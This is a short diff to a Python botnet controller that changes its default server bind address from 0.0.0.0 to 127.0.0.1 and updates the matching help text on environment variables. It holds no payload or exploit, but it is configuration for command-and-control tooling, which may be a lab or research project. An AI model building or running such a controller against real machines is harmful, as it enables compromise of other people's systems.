@@ -58,7 +58,7 @@ class BotnetController:
         self.validator = InputValidator()
         self.bot_tracker = BotTracker()
 
-        self.host = self.config.get("SERVER_HOST", "0.0.0.0")
+        self.host = self.config.get("SERVER_HOST", "127.0.0.1")
         self.port = self.config.get("SERVER_PORT", 9999)
         self.max_connections = self.config.get("MAX_CONNECTIONS", 100)
 
@@ -456,7 +456,7 @@ Examples:
   %(prog)s --verbose                # Enable debug logging
 
 Environment Variables:
-  BOTNET_HOST             Server bind address (default: 0.0.0.0)
+  BOTNET_HOST             Server bind address (default: 127.0.0.1)
   BOTNET_PORT             Server port (default: 9999)
   BOTNET_ADMIN_PASSWORD   Admin authentication password
   BOTNET_ENCRYPTION_KEY   Base64-encoded encryption key
